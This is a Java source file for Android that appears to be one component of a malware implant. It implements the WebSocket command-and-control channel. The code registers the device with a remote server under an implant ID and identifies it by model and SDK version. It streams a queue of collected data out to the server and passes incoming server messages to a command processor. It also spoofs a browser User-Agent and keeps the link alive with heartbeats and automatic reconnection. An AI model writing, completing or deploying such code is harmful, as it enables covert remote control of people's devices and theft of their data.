// ============================================================
// FILE 14: comms/WSSClient.java
// ============================================================
package io.hackerai.implant.comms;

import android.content.Context;
import android.os.Build;
import android.util.Log;

import org.json.JSONObject;

import java.util.concurrent.LinkedBlockingQueue;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;

import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import okhttp3.WebSocket;
import okhttp3.WebSocketListener;

/**
 * WSSClient — persistent WebSocket C2 channel.
 *
 * Features:
 *   - Automatic reconnection with exponential backoff (1s → 60s max)
 *   - Heartbeat every 30s of inactivity
 *   - Drains the shared outbox queue
 *   - TLS via wss:// (cleartext ws:// fallback with warning)
 */
public class WSSClient {
    private static final String TAG = "WSSClient";

    private final Context ctx;
    private final String url;
    private final String implantId;
    private final LinkedBlockingQueue<String> outbox;
    private final AtomicBoolean connected = new AtomicBoolean(false);
    private final AtomicBoolean shutdown = new AtomicBoolean(false);
    private final AtomicInteger reconnectDelay = new AtomicInteger(1);

    private OkHttpClient httpClient;
    private WebSocket webSocket;
    private Thread drainThread;
    private long lastSentMs = 0;

    public WSSClient(Context ctx, String url, String implantId,
                     LinkedBlockingQueue<String> outbox) {
        this.ctx = ctx.getApplicationContext();
        this.url = url;
        this.implantId = implantId;
        this.outbox = outbox;
    }

    /** Initiate connection */
    public void connect() {
        shutdown.set(false);

        OkHttpClient.Builder builder = new OkHttpClient.Builder()
                .pingInterval(30, TimeUnit.SECONDS)
                .readTimeout(0, TimeUnit.SECONDS)
                .writeTimeout(0, TimeUnit.SECONDS)
                .connectTimeout(15, TimeUnit.SECONDS);

        // Disable cleartext restriction for ws:// if needed
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P && url.startsWith("ws://")) {
            builder.retryOnConnectionFailure(true);
        }

        httpClient = builder.build();

        Request request = new Request.Builder()
                .url(url)
                .header("X-Implant-Id", implantId)
                .header("User-Agent", "Mozilla/5.0 (Linux; Android " + Build.VERSION.RELEASE + ")")
                .build();

        Log.d(TAG, "Connecting to " + url);
        httpClient.newWebSocket(request, new WSSListener());
        startDrainThread();
    }

    /** Disconnect cleanly */
    public void disconnect() {
        shutdown.set(true);
        if (webSocket != null) {
            webSocket.close(1001, "Shutdown");
            webSocket = null;
        }
        if (httpClient != null) {
            httpClient.dispatcher().executorService().shutdownNow();
        }
        if (drainThread != null) {
            drainThread.interrupt();
        }
        connected.set(false);
    }

    /** Background thread that drains the outbox queue to the WebSocket */
    private void startDrainThread() {
        drainThread = new Thread(() -> {
            while (!shutdown.get()) {
                try {
                    if (!connected.get()) {
                        Thread.sleep(1000);
                        continue;
                    }
                    // Send heartbeat if idle > 30s
                    if (System.currentTimeMillis() - lastSentMs > 30_000L) {
                        JSONObject hb = new JSONObject();
                        hb.put("type", "hb");
                        hb.put("ts", System.currentTimeMillis());
                        hb.put("id", implantId);
                        String hbStr = hb.toString();
                        if (webSocket != null) webSocket.send(hbStr);
                        lastSentMs = System.currentTimeMillis();
                    }

                    // Blocking poll with timeout
                    String msg = outbox.poll(5, TimeUnit.SECONDS);
                    if (msg != null && webSocket != null) {
                        webSocket.send(msg);
                        lastSentMs = System.currentTimeMillis();
                    }
                } catch (InterruptedException e) {
                    break;
                } catch (Exception e) {
                    Log.e(TAG, "Drain error", e);
                }
            }
        }, "wss-drain");
        drainThread.setDaemon(true);
        drainThread.start();
    }

    // ----------------------------------------------------------
    // WebSocket listener — handles connect, message, failure
    // ----------------------------------------------------------
    private class WSSListener extends WebSocketListener {
        @Override
        public void onOpen(WebSocket ws, Response response) {
            connected.set(true);
            reconnectDelay.set(1);
            webSocket = ws;
            Log.i(TAG, "WebSocket connected to " + url);

            // Send registration immediately
            try {
                JSONObject reg = new JSONObject();
                reg.put("type", "register");
                reg.put("id", implantId);
                reg.put("platform", "android");
                reg.put("sdk", Build.VERSION.SDK_INT);
                reg.put("device", Build.MODEL);
                ws.send(reg.toString());
            } catch (Exception e) {
                Log.e(TAG, "Reg failed", e);
            }
        }

        @Override
        public void onMessage(WebSocket ws, String text) {
            Log.d(TAG, "WS message: " + text.substring(0, Math.min(200, text.length())));
            ChannelClient client = ChannelClient.getInstance(ctx);
            if (client != null) {
                client.processCommand(text);
            }
        }

        @Override
        public void onClosed(WebSocket ws, int code, String reason) {
            connected.set(false);
            Log.w(TAG, "WebSocket closed: " + code + " / " + reason);
            scheduleReconnect();
        }

        @Override
        public void onFailure(WebSocket ws, Throwable t, Response response) {
            connected.set(false);
            Log.e(TAG, "WebSocket failure: " + (t != null ? t.getMessage() : "null"));
            scheduleReconnect();
        }
    }

    /** Exponential backoff reconnection */
    private void scheduleReconnect() {
        if (shutdown.get()) return;
        int delay = reconnectDelay.getAndUpdate(d -> Math.min(d * 2, 60));
        Log.d(TAG, "Reconnecting in " + delay + "s...");
        new Thread(() -> {
            try {
                Thread.sleep(delay * 1000L);
            } catch (InterruptedException ignored) {}
            if (!shutdown.get()) connect();
        }, "wss-reconnect").start();
    }
}
